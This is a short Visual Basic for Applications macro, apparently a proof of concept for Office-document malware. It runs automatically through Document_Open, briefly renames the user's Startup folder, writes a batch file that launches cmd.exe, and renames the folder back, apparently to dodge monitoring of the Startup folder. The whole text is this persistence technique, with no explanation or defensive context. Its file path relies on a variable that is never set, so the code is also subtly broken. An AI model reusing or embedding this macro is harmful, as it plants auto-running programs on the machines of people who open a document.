Sub Document_Open()
OldStartup = CreateObject("WScript.Shell").SpecialFolders("Startup")
NewStartup = Replace(OldStartup, "Startup", "test")
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FolderExists(NewStartup) = False Then
 'Rename the original startup folder
 Name OldStartup As NewStartup 
 Set objFile = objFSO.CreateTextFile(Path & "\test.bat", True) 
 objFile.Write "cmd.exe" 
 objFile.Close
 'Rename it back to Startup
 Name NewStartup As OldStartup 
End If
End Sub